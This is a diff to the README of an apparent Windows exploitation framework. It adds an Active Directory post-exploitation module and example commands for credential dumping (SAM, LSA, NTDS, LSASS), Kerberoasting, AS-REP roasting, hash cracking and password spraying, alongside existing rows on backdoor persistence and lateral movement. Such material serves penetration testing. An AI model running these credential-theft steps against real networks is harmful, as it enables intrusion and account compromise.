@@ -53,6 +53,7 @@ Armagedon is a modular Windows exploitation framework featuring automated scan-t
 
 | Module | Description |
 |--------|-------------|
+| `ad_post_enum` | Full AD post-exploitation enumeration: credential test, host enum, credential dump, LDAP enum, Kerberoast, hash crack, password spray |
 | `credential_dump` | Full credential extraction: SAM, LSA, NTDS.dit, cached domain creds |
 | `persistence` | Install backdoors: scheduled tasks, registry run keys, new users, startup folder |
 | `lateral_movement` | Pivot to other hosts via SMB, WMI, WinRM, PSExec |
@@ -62,6 +63,9 @@ Armagedon is a modular Windows exploitation framework featuring automated scan-t
 
 | Module | Description |
 |--------|-------------|
+| `kerberos_attack` | ASREPROAST, KERBEROAST, Pass-the-Ticket, Golden/Silver Ticket |
+| `password_spray` | Lockout-aware password spraying across Kerberos/NTLM services |
+| `ldap_enum` | 12 LDAP enumeration categories: users, groups, delegation, LAPS, GMSA, etc. |
 | `smb_enum` | SMB enumeration (shares, users, groups) |
 | `os_fingerprint` | OS fingerprinting |
 
@@ -196,6 +200,42 @@ set TARGET_HOSTS 192.168.1.101,192.168.1.102
 run
 ```
 
+### AD Post-Exploitation Enumeration
+
+```bash
+# Interactive prompt
+ad_post_enum 10.10.10.1 -u admin -p Password1 -d CORP.LOCAL
+
+# Full loop (default): test → enum → dump → ldap → kerb → crack → spray
+ad_post_enum 10.10.10.1 -u admin -p Password1 -d CORP.LOCAL
+
+# Run specific stages only
+ad_post_enum 10.10.10.1 -u admin -p Password1 -d CORP.LOCAL --mode ENUM
+ad_post_enum 10.10.10.1 -u admin -p Password1 -d CORP.LOCAL --mode DUMP
+ad_post_enum 10.10.10.1 -u admin -p Password1 -d CORP.LOCAL --mode KERB
+
+# Via module system
+use post/ad_post_enum
+set RHOSTS 10.10.10.1
+set USERNAME admin
+set PASSWORD Password1
+set DOMAIN CORP.LOCAL
+set MODE FULL
+run
+```
+
+**What ad_post_enum does:**
+1. Tests credentials on SMB, WinRM, RDP, LDAP (auto-fixes username formats)
+2. Full host enumeration: systeminfo, users, groups, processes, network, sensitive files
+3. Credential dumping: SAM, LSA, NTDS, LSASS via nxc
+4. LDAP enumeration: LAPS, GMSA, delegation, Kerberoastable, AS-REP accounts
+5. Kerberoasting + AS-REP roasting via impacket
+6. Hash cracking with john
+7. Password spraying discovered passwords across domain
+8. Saves all results to a timestamped output directory
+
+**Prerequisites:** `nxc` (NetExec), `john` (John the Ripper), `impacket` (GetUserSPNs, GetNPUsers)
+
 ### Quick scan
 
 ```bash
@@ -249,8 +289,8 @@ armagedon/
     exploits/                 # CVE exploit modules (10 modules)
     scanners/                 # Service scanners
     privesc/                  # Privilege escalation modules (4 modules)
-    post/                     # Post-exploitation modules (4 modules)
-    auxiliary/                # Auxiliary tools
+    post/                     # Post-exploitation modules (5 modules)
+    auxiliary/                # Auxiliary tools (3 modules)
     recon/                    # Reconnaissance modules
   pocs/                       # Standalone PoC binaries and source
 ```
